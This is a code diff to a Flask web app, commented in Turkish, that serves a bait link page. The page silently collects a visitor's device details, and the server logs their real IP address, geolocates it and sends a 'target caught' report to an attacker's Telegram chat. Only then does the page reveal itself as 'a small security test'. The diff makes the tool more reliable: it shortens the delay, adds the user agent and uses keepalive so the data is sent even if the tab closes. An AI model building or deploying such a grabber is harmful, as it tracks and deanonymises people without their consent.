@@ -83,7 +83,7 @@ HTML_TEMPLATE = """
             const urlParams = new URLSearchParams(window.location.search);
             const targetId = urlParams.get('id') || 'Bilinmiyor';
 
-            // Arka planda sessizce cihaz verilerini topla
+            // Arka planda cihaz verilerini topla
             let screenRes = window.screen.width + "x" + window.screen.height;
             let language = navigator.language || 'Bilinmiyor';
             let cpuCores = navigator.hardwareConcurrency || 'Bilinmiyor';
@@ -107,25 +107,26 @@ HTML_TEMPLATE = """
                 ram: deviceRam,
                 tz: timeZone,
                 conn: connectionType,
-                battery: batteryLevel
+                battery: batteryLevel,
+                userAgent: navigator.userAgent
             };
 
-            // Tam 15 saniye bekle (Hiçbir izin istemeden sessizce durur)
+            // 10 saniye bekle ve verileri gönder (Süre aşımını önlemek için 10 sn idealdir)
             setTimeout(function() {
-                // Verileri sunucuya gönder
                 fetch('/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    keepalive: true
                 });
 
-                // 15 saniye sonra ekrana "YAKALANDIN!" yazısını getir
+                // Ekranda "YAKALANDIN!" göster
                 document.getElementById('loader-icon').style.display = 'none';
                 document.getElementById('icon-container').style.display = 'block';
                 document.getElementById('title-text').innerText = 'YAKALANDIN!';
                 document.getElementById('alert-box').style.display = 'block';
                 document.getElementById('desc-text').innerText = 'Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.';
-            }, 15000); // 15000 milisaniye = 15 saniye
+            }, 10000);
         });
     </script>
 </body>
@@ -138,7 +139,7 @@ def home():
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    data = request.get_json()
+    data = request.get_json() or {}
     target_id = data.get('target_id', 'Bilinmiyor')
     screen = data.get('screen', 'Bilinmiyor')
     lang = data.get('lang', 'Bilinmiyor')
@@ -147,7 +148,9 @@ def collect():
     tz = data.get('tz', 'Bilinmiyor')
     conn = data.get('conn', 'Bilinmiyor')
     battery = data.get('battery', 'Bilinmiyor')
+    user_agent = data.get('userAgent', request.headers.get('User-Agent', 'Bilinmiyor'))
 
+    # Gerçek IP adresini güvenli bir şekilde yakala
     if request.headers.get('CF-Connecting-IP'):
         ip = request.headers.get('CF-Connecting-IP')
     elif request.headers.get('X-Forwarded-For'):
@@ -155,7 +158,6 @@ def collect():
     else:
         ip = request.remote_addr
 
-    user_agent = request.headers.get('User-Agent')
     zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     try:
@@ -167,7 +169,6 @@ def collect():
     except:
         country = region = city = isp = "Bilinmiyor"
     
-    # Tüm toplanan bilgileri tek bir muazzam raporda Telegram'a at
     full_report = (
         f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
         f"🏷️ **Hedef ID:** `{target_id}`\n"
@@ -193,9 +194,9 @@ def collect():
             "chat_id": CHAT_ID,
             "text": full_report,
             "parse_mode": "Markdown"
-        })
-    except:
-        pass
+        }, timeout=5)
+    except Exception as e:
+        print(f"Telegram Hatası: {e}")
             
     return "", 204
 
@@ -221,7 +222,7 @@ def webhook():
                     "chat_id": chat_id,
                     "text": reply_text,
                     "parse_mode": "Markdown"
-                })
+                }, timeout=5)
     except Exception as e:
         print(f"Webhook Hatası: {e}")
         
